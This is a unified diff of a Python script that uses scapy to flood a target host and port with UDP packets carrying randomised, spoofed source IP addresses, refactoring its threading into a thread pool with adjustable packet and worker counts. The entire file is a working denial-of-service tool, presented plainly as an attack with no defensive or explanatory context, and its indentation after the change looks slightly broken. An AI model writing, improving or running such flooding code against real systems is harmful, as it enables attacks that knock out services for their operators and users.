@@ -1,28 +1,30 @@
 from scapy.all import IP, UDP, RandIP, send
 import threading
+from concurrent.futures import ThreadPoolExecutor
 
 
-def udpflood(destiny, destiny_port, num_of_threads):
-    count = 0
-    send_threads = []
-
-    for _ in range(num_of_threads):
+def send_udp_packet(destiny, destiny_port):
         source = RandIP()
 
         ip_packet = IP(src=source, dst=destiny)
         udp_packet = UDP(dport=destiny_port)
 
         complete_packet = ip_packet / udp_packet
-
-        thread = threading.Thread(target=send, args=(complete_packet, 0))
-        send_threads.append(thread)
-        thread.start()
-
-    for thread in send_threads:
-        thread.join()
-        count = count + 1
+        send(complete_packet, verbose=False)
     
-    print(f"Packets sent = {count}")
+    
+def udpflood(destiny, destiny_port, num_of_packets, num_of_workers):
+    with ThreadPoolExecutor(max_workers=num_of_workers) as executor:
+        for _ in range(num_of_packets):
+            executor.submit(send_udp_packet, destiny, destiny_port)
+
+    print(f"Total de pacotes enviados: {num_of_packets}")
+
+
+
+
+
+
 
 
 
